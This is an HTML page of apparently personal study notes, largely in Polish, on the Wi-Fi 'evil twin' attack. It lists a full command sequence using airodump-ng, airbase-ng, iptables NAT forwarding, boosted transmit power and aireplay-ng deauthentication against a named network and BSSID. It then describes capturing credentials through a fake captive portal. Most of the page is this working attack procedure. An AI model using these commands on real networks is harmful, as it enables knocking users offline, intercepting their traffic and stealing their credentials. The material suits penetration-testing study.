<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta http-equiv="X-UA-Compatible" content="ie=edge" />
<link rel="stylesheet" href="/_assets/main.css" />

    <title>Evil Twin attack - Notatki</title>
  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
  <body>
    <div class="main">
      <nav class="navigation">
        <a href="/">Notatki</a>
      </nav>
      <article>
        <header>
          <h1 class="article-title">Evil Twin attack</h1>
          <div class="article-info">
            <div>
              <span
                >Created At：<time datetime="1660211861671"
                  >2022-08-11 05:57</time
                ></span
              >
              <span
                >Updated At：<time datetime="1660213780949"
                  >2022-08-11 06:29</time
                ></span
              >
            </div>
            
          </div>
        </header>
        <div class="article-content markdown-body"><div><pre class="hljs"><code><span class="hljs-variable">$ </span>airodump-ng wlan0mon	 <span class="hljs-comment"># dump pakietów z ze skonfigurowanego wcześniej interfejsu</span>
<span class="hljs-comment"># Identify a legitimate access point.</span>
<span class="hljs-comment"># \/ tworz nowy tap interfejs at0 używany do otrzymywania odszyfrowanych pakietów i wysyłania zaszyfrowanych</span>
<span class="hljs-comment"># tworzy fejkowy AP o nazwie jak prawdziwy i pracujący na tym samym kanale ale mający inny BSSID,</span>
<span class="hljs-comment"># prawdziwy AP jest zazwyczaj chroniony hasłem, fałszywy jest bez hasła </span>
<span class="hljs-variable">$ </span>airbase-ng -e Moomin -c <span class="hljs-number">1</span> wlan0mon <span class="hljs-comment"># Clone the access point.</span>
<span class="hljs-comment"># -e -nazwa tworzonego punktu (ESSID)</span>
<span class="hljs-comment"># -c -kanał wifi</span>
<span class="hljs-comment"># wlan0mon -ustaw replay interface jako wlan0mon</span>
<span class="hljs-variable">$ </span>ifconfig at0 up <span class="hljs-comment"># podnosi interfejs</span>
<span class="hljs-variable">$ </span>ifconfig at0 <span class="hljs-number">192.168</span>.<span class="hljs-number">2.1</span> netmask <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span> <span class="hljs-comment"># ustaw IP i maskę dla portu</span>
<span class="hljs-variable">$ </span>route add –net <span class="hljs-number">192.168</span>.<span class="hljs-number">2.0</span> netmask <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span> gw <span class="hljs-number">192.168</span>.<span class="hljs-number">2.1</span> <span class="hljs-comment"># statyczny routing, ruch z połączonych klientów będzie forwardowany do prawdziwego gateway</span>
<span class="hljs-variable">$ </span>iptables –P FORWARD ACCEPT <span class="hljs-comment"># iptables to create a policy that accepts forwarding in the chain target. This makes our attacking machine act like a router, even though it isn't. </span>
<span class="hljs-variable">$ </span>iptables –t nat –A POSTROUTING –o wlan0mon –j MASQUERADE <span class="hljs-comment"># route outbound traffic without disrupting the normal flow of traffic on the network, MASQUERADE option acts like a source NAT</span>
<span class="hljs-variable">$ </span>echo <span class="hljs-number">1</span> &gt; <span class="hljs-regexp">/proc/sys</span><span class="hljs-regexp">/net/ipv</span>4/ip_forward <span class="hljs-comment"># enable IP forwarding by setting the flag to 1</span>
<span class="hljs-variable">$ </span>iwconfig wlan0mon txpower <span class="hljs-number">27</span> <span class="hljs-comment"># adapters that support it, we can increase the power of the evil twin by changing the signal strength using the txpower option with iwconfig. (27 dB or 500 mW,legal limit in the U.S.)</span>
<span class="hljs-variable">$ </span>aireplay-ng –deauth <span class="hljs-number">50</span> –a <span class="hljs-symbol">C8:</span><span class="hljs-number">91</span><span class="hljs-symbol">:F9</span><span class="hljs-symbol">:A2</span><span class="hljs-symbol">:</span><span class="hljs-number">83</span><span class="hljs-symbol">:</span><span class="hljs-number">18</span> wlan0mon <span class="hljs-comment"># Conduct a de-authentication attack, kick wireless clients off the legitimate access point </span>
<span class="hljs-comment"># ‑deauth 50 -send fifty 802.11 deauthentication frames to the Moomin network</span></code></pre></div>
<p>One common tactic that follows on from an evil twin attack is to present the user with a captive portal. A captive portal is a web page to which a client is redirected when they connect to a guest SSID. The client can gain access to the internet after they successfully authenticate or accept the terms of use on the portal page. Captive portals will be familiar to anyone that uses Wi‑Fi offered in public places, including hotels, transport hubs, and coffee shops. If we can trick the user into thinking that they need to reauthenticate after momentarily being disconnected from the network, we can capture those credentials and use them to gain access to the target network.</p>
</div>
      </article>
    </div>
  </body>
</html>
